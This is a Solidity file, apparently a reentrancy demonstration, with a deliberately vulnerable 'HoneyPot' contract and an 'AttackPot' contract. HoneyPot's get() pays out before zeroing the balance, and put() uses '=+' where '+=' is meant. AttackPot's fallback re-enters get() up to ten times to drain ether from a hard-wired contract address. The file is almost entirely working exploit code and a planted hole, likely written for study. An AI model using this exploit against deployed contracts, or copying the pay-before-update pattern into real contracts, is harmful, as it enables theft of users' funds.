pragma solidity 0.4.24;

contract HoneyPot {
    mapping (address => uint) public balances;

    event LogPut(address indexed who, uint howMuch);
    event LogGot(address indexed who, uint howMuch);

    constructor() payable public {
        put();
    }

    function put() payable public {
        emit LogPut(msg.sender, msg.value);
        balances[msg.sender] =+ msg.value;
    }

    function get() public {
        emit LogGot(msg.sender, balances[msg.sender]);
        require(msg.sender.call.value(balances[msg.sender])());
        balances[msg.sender] = 0;
    }

    function() private {
        revert();
    }
}

contract AttackPot {
    address hardwiredPot = 0x49440a9Ee139FD7b82109a0DbCCe5000Ae1Da8cA;
    HoneyPot hp;
    uint public count;
    
    event LogCalledPut (address attackAddr, uint attackBalance);
    event LogCalledGet (address attackAddr, uint attackBalance);
    event LogFallbackCalled (uint count, uint attackBalance);

    constructor() public payable {
        hp = HoneyPot(hardwiredPot);
    }
    
    function callGet() public {
        // hp.call(bytes4(keccak256("get()")));
        // attack starts here
        hp.get();
        emit LogCalledGet(address(this), address(this).balance);
    }
    
    function callPut(uint val) public {
        hp.put.value(val)();        
        emit LogCalledPut(address(this), address(this).balance);
    }

    function() payable {
        count++;
        emit LogFallbackCalled(count, address(this).balance);
        if (count < 11) hp.get();
    }
}
